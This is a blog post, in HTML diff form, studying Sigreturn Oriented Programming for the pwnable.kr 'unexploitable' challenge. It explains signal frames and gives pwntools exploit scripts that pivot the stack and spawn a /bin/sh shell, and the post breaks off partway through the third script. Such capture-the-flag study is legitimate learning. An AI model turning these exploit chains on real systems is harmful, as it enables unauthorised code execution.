@@ -1,0 +1,2156 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Tianji">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Tianji">
+    <meta name="keywords" content="SROP-study | Tianji">
+    <meta name="description" content="">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>SROP-study · Tianji&#39;s Blog</title>
+    <!-- 设置密码 -->
+    <script>
+        (function(){
+            if(''){
+                if (prompt('请输入文章密码','') !== ''){
+                    alert('密码错误！');
+                    history.back();
+                }
+            }
+        })();
+    </script>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180721" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180721" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin="">
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin="">
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Tianji&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">SROP-study</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">Tianji's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="height:50vh;">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            SROP-study
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">2,288</span> / Reading time: <span class="post-count">13 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/11/04</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;">
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><h2 id="pwnable-kr-unexploitable"><a href="#pwnable-kr-unexploitable" class="headerlink" title="pwnable.kr-unexploitable"></a>pwnable.kr-unexploitable</h2><p>SROP:</p>
+<p>可以用来控制所有的寄存器，进行stack pivot。</p>
+<p>Sigreturn Oriented Programming (SROP)，这个方法是用来攻击POSIX主机的信号处理机制的。</p>
+<p>Linux系统上，Signal本质上是对<code>中断机制的模拟</code>，Signal的来源主要有以下途径：</p>
+<ol>
+<li>硬件来源：按下键盘或者其他故障</li>
+<li>软件来源: <code>kill</code>等；非法操作</li>
+</ol>
+<p>接收到Single之后，流程如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  +---------+             +---------+             +---------+</span><br><span class="line">    | Process |             | Handler |             | Process |</span><br><span class="line">    +---------+             +---------+             +---------+</span><br><span class="line">        |                       ^   |                   ^</span><br><span class="line">User    |                       |   |                   |</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">Kenerl  |                       |   |                   |</span><br><span class="line">        |       +---------+     |   |   +---------+     |</span><br><span class="line">        +------&gt;|  Save   |-----+   +--&gt;| Restore |-----+</span><br><span class="line">                +---------+             +---------+</span><br></pre></td></tr></table></figure>
+<ol>
+<li>进入内核态</li>
+<li>保存上下文</li>
+<li>回到用户态执行相关信号处理函数</li>
+<li>进入内核态恢复上下文</li>
+<li>进程继续执行</li>
+</ol>
+<p>在程序接受Signal后，内核将进程的上下文<code>context(r8-r15, rax, rbx, rcx, rdx, rdi, rsi等)</code>保存在<code>栈</code>上，称作<code>Signal Frame</code>；当进程收到<code>rt_sigreturn</code>会从栈上取<code>Signal Frame</code>用来恢复进程的上下文。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">                    Signal Frame</span><br><span class="line">+-------------------------+-------------------------+</span><br><span class="line">|        rt_sigreturn     |         uc_flags        |</span><br><span class="line">+-------------------------+-------------------------+</span><br><span class="line">|          &amp;uc            |       uc_stack.ss_sp    |</span><br><span class="line">+-------------------------+-------------------------+</span><br><span class="line">|    uc_stack.ss_flags    |    uc_stack.ss_size     |</span><br><span class="line">+-------------------------+-------------------------+</span><br><span class="line">|          r8             |           r9            |</span><br><span class="line">+-------------------------+-------------------------+</span><br><span class="line">|          r10            |           r11           |</span><br><span class="line">+-------------------------+-------------------------+</span><br><span class="line">|          r12            |           r13           |</span><br><span class="line">+-------------------------+-------------------------+</span><br><span class="line">|          r14            |           r15           |</span><br><span class="line">+-------------------------+-------------------------+</span><br><span class="line">|          rdi            |           rsi           |</span><br><span class="line">+-------------------------+-------------------------+</span><br><span class="line">|          rbp            |           rbx           |</span><br><span class="line">+-------------------------+-------------------------+</span><br><span class="line">|          rdx            |           rax           |</span><br><span class="line">+-------------------------+-------------------------+</span><br><span class="line">|          rcx            |           rsp           |</span><br><span class="line">+-------------------------+-------------------------+</span><br><span class="line">|          rip            |           eflags        |</span><br><span class="line">+-------------------------+-------------------------+</span><br><span class="line">|        cs/gs/fs         |           err           |</span><br><span class="line">+-------------------------+-------------------------+</span><br><span class="line">|         trapno          |         oldmask         |</span><br><span class="line">+-------------------------+-------------------------+</span><br><span class="line">|          cr2            |          %fpstate       |</span><br><span class="line">+-------------------------+-------------------------+</span><br><span class="line">|       __reserved        |         sigmask         |</span><br><span class="line">+-------------------------+-------------------------+</span><br></pre></td></tr></table></figure>
+<p>所以，可选的攻击方式就是构造一个<code>fake signal frame</code>写入内存中，将然后将<code>RSP</code>指向这段空间，再发送<code>rt_sigreturn</code>信号。此时，内核会将构造好的<code>fake signal frame</code>取出，恢复。恢复后类似于ROP的方式，为syscall调用<code>execve</code>。</p>
+<h3 id="SROP-自主组装sig-frame"><a href="#SROP-自主组装sig-frame" class="headerlink" title="SROP(自主组装sig_frame):"></a>SROP(自主组装sig_frame):</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = remote(&quot;127.0.0.1&quot;, 10001)</span><br><span class="line">elf = ELF(&quot;./unexploitable&quot;)</span><br><span class="line">bss_base = 0x0000000000601028 + 0x100</span><br><span class="line">sig_stage = bss_base + 0x400</span><br><span class="line">syscall_addr = 0x00400560</span><br><span class="line">pop_rbp_ret = 0x00400512#: pop rbp ; ret  ;  (1 found)</span><br><span class="line">leave_ret = 0x00400576#: leave  ; ret  ;  (1 found)</span><br><span class="line">part1 = 0x004005e6#: mov rbx, qword [rsp+0x08] ; mov rbp, qword [rsp+0x10] ; mov r12, qword [rsp+0x18] ; mov r13, qword      [rsp+0x20] ; mov r14, qword [rsp+0x28] ; mov r15, qword [rsp+0x30] ; add rsp, 0x38 ; ret  ;  (1 found)</span><br><span class="line">part2 = 0x004005d0#: mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword [r12+rbx*8] ;  (1 found)</span><br><span class="line">def call_function(call_addr, arg1, arg2, arg3):</span><br><span class="line">    payload = &quot;&quot;</span><br><span class="line">    payload += p64(part1)       # =&gt; RSP</span><br><span class="line">    payload += &quot;A&quot; * 8</span><br><span class="line">    payload += p64(0)           # =&gt; RBX</span><br><span class="line">    payload += p64(1)           # =&gt; RBP</span><br><span class="line">    payload += p64(call_addr)   # =&gt; R12 =&gt; RIP</span><br><span class="line">    payload += p64(arg1)        # =&gt; R13 =&gt; RDI</span><br><span class="line">    payload += p64(arg2)        # =&gt; R14 =&gt; RSI</span><br><span class="line">    payload += p64(arg3)        # =&gt; R16 =&gt; RDX</span><br><span class="line">    payload += p64(part2)</span><br><span class="line">    payload += &quot;C&quot; * 0x38</span><br><span class="line">    return payload</span><br><span class="line"></span><br><span class="line">sig_frame  = &quot;&quot;</span><br><span class="line">sig_frame += p64(syscall_addr) + p64(0)</span><br><span class="line">sig_frame += p64(0) + p64(0)</span><br><span class="line">sig_frame += p64(0) + p64(0)</span><br><span class="line">sig_frame += p64(0) + p64(0)            # r8 r9</span><br><span class="line">sig_frame += p64(0) + p64(0)            # r10 r11</span><br><span class="line">sig_frame += p64(0) + p64(0)            # r12 r13</span><br><span class="line">sig_frame += p64(0) + p64(0)            # r14 r15</span><br><span class="line">sig_frame += p64(bss_base+0x200) + p64(0)   # rdi rsi</span><br><span class="line">sig_frame += p64(0) + p64(0)            # rbp rbx</span><br><span class="line">sig_frame += p64(0) + p64(59)           # rdx rax(execve)</span><br><span class="line">sig_frame += p64(0) + p64(0)            # rcx rsp</span><br><span class="line">sig_frame += p64(syscall_addr) + p64(0x207) # rip eflags</span><br><span class="line">sig_frame += p64(0x33) + p64(0)         # cs/gs/fs err</span><br><span class="line">sig_frame += p64(0) + p64(0)            # trapno oldmask</span><br><span class="line">sig_frame += p64(0) + p64(0)            # cr2 &amp;fpstate</span><br><span class="line">sig_frame += p64(0) + p64(0)            # __reserved sigmask</span><br><span class="line"></span><br><span class="line">payload1  = &quot;A&quot; * 0x10</span><br><span class="line">payload1 += p64(bss_base)</span><br><span class="line">payload1 += call_function(elf.got[&quot;read&quot;], 0, bss_base, 0x300)</span><br><span class="line">payload1 += p64(pop_rbp_ret)</span><br><span class="line">payload1 += p64(bss_base)</span><br><span class="line">payload1 += p64(leave_ret)</span><br><span class="line">payload2  = p64(bss_base+0x8)</span><br><span class="line">payload2 += call_function(elf.got[&quot;read&quot;], 0, sig_stage, 0x100)</span><br><span class="line">payload2 += sig_frame</span><br><span class="line">payload2  = payload2.ljust(0x200, &quot;\x00&quot;)</span><br><span class="line">payload2 += &quot;/bin/sh\x00&quot;</span><br><span class="line">payload3  = &quot;D&quot; * 0xf</span><br><span class="line"></span><br><span class="line">sleep(3)</span><br><span class="line">raw_input()</span><br><span class="line">io.send(payload1)</span><br><span class="line">raw_input()</span><br><span class="line">io.send(payload2)</span><br><span class="line">raw_input()</span><br><span class="line">io.send(payload3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="SROP-调用SigreturnFrame"><a href="#SROP-调用SigreturnFrame" class="headerlink" title="SROP(调用SigreturnFrame())"></a>SROP(调用SigreturnFrame())</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding:utf-8</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.update(os = &apos;linux&apos;, arch = &apos;amd64&apos;)</span><br><span class="line">context.log_level =&quot;debug&quot;</span><br><span class="line">syscall_addr = 0x400560</span><br><span class="line">set_read_addr = 0x40055b</span><br><span class="line">read_addr = 0x400571</span><br><span class="line">fake_stack_addr = 0x60116c</span><br><span class="line">fake_ebp_addr = 0x60116c</span><br><span class="line">binsh_addr = 0x60115c</span><br><span class="line"></span><br><span class="line">#io = remote(&apos;172.17.0.3&apos;, 10001)</span><br><span class="line">io = process(&quot;./unexploitable&quot;)</span><br><span class="line">payload = &quot;&quot;</span><br><span class="line">payload += &apos;a&apos;*16				#padding</span><br><span class="line">payload += p64(fake_stack_addr)	</span><br><span class="line">payload += p64(set_read_addr)	#lea rax, [rbp+buf]; mov edx, 50Fh; mov rsi, rax; mov edi, 0; mov eax, 0; call _read</span><br><span class="line">sleep(3)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">frameExecve = SigreturnFrame()				#SROP Frame</span><br><span class="line">frameExecve.rax = constants.SYS_execve</span><br><span class="line">frameExecve.rdi = binsh_addr</span><br><span class="line">frameExecve.rsi = 0</span><br><span class="line">frameExecve.rdx = 0</span><br><span class="line">frameExecve.rip = syscall_addr</span><br><span class="line"></span><br><span class="line">payload = &quot;&quot;</span><br><span class="line">payload += &quot;/bin/sh\x00&quot;				                 # 5c</span><br><span class="line">payload += &apos;a&apos;*8						#padding</span><br><span class="line">payload += p64(fake_stack_addr+0x10)	                 # 6c</span><br><span class="line">payload += p64(read_addr)				</span><br><span class="line">payload += p64(fake_ebp_addr)           # p64(0) is ok too	7c		</span><br><span class="line">payload += p64(syscall_addr)			                    </span><br><span class="line">payload += str(frameExecve)				#SigreturnFrame   8c</span><br><span class="line">io.send(payload)</span><br><span class="line">sleep(1)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.send(&quot;/bin/sh\x00&quot; + (&apos;a&apos;)*7)		</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./unexploitable&quot;)</span><br><span class="line">elf = ELF(&quot;./unexploitable&quot;)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">pop_rbp = 0x400512</span><br><span class="line">leave_ret = 0x400576</span><br><span class="line">syscall_addr = 0x400560</span><br><span class="line">bss_addr = 0x601028 + 0x200</span><br><span class="line">sh_addr = 0x601028 + 0x400</span><br><span class="line"># rdi, rsi, rdx, rcx, r8, r9</span><br><span class="line"> </span><br><span class="line">gadget_1 = 0x4005e6</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">   0x00000000004005e6 &lt;+102&gt;:   mov    rbx,QWORD PTR [rsp+0x8]</span><br><span class="line">   0x00000000004005eb &lt;+107&gt;:   mov    rbp,QWORD PTR [rsp+0x10]</span><br><span class="line">   0x00000000004005f0 &lt;+112&gt;:   mov    r12,QWORD PTR [rsp+0x18]</span><br><span class="line">   0x00000000004005f5 &lt;+117&gt;:   mov    r13,QWORD PTR [rsp+0x20]</span><br><span class="line">   0x00000000004005fa &lt;+122&gt;:   mov    r14,QWORD PTR [rsp+0x28]</span><br><span class="line">   0x00000000004005ff &lt;+127&gt;:   mov    r15,QWORD PTR [rsp+0x30]</span><br><span class="line">   0x0000000000400604 &lt;+132&gt;:   add    rsp,0x38</span><br><span class="line">   0x0000000000400608 &lt;+136&gt;:   ret </span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"> </span><br><span class="line">gadget_2 = 0x4005d0</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">   0x00000000004005d0 &lt;+80&gt;:    mov    rdx,r15</span><br><span class="line">   0x00000000004005d3 &lt;+83&gt;:    mov    rsi,r14</span><br><span class="line">   0x00000000004005d6 &lt;+86&gt;:    mov    edi,r13d</span><br><span class="line">   0x00000000004005d9 &lt;+89&gt;:    call   QWORD PTR [r12+rbx*8]</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"> </span><br><span class="line">def call_function(call_addr, arg1, arg2, arg3):</span><br><span class="line">    payload = &quot;&quot;</span><br><span class="line">    payload += p64(gadget_1)    # =&gt; rsp</span><br><span class="line">    payload += &quot;A&quot; * 8</span><br><span class="line">    payload += p64(0)           # =&gt; rbx</span><br><span class="line">    payload += p64(1)           # =&gt; 1</span><br><span class="line">    payload += p64(call_addr)   # =&gt; r12 =&gt; call addr</span><br><span class="line">    payload += p64(arg1)        # =&gt; r13 =&gt; edi =&gt; rdi</span><br><span class="line">    payload += p64(arg2)        # =&gt; r14 =&gt; rsi</span><br><span class="line">    payload += p64(arg3)        # =&gt; r15 =&gt; rdx</span><br><span class="line">    payload += p64(gadget_2)    # =&gt; rsp + 38</span><br><span class="line">    payload += &quot;C&quot; * 0x38</span><br><span class="line">    return payload</span><br><span class="line">    </span><br><span class="line"># use read to set rax as 0x59</span><br><span class="line">payload1 = &quot;A&quot; * 0x10 + p64(bss_addr) # &quot;A&quot; * 0x10 + p64(0) is ok too</span><br><span class="line">payload1 += call_function(elf.got[&apos;read&apos;], 0, bss_addr, 0x200)</span><br><span class="line">payload1 += p64(pop_rbp)</span><br><span class="line">payload1 += p64(bss_addr)</span><br><span class="line">payload1 += p64(leave_ret)</span><br><span class="line"></span><br><span class="line">payload2 = p64(bss_addr + 0x8)       # p64(0x0)  is ok too</span><br><span 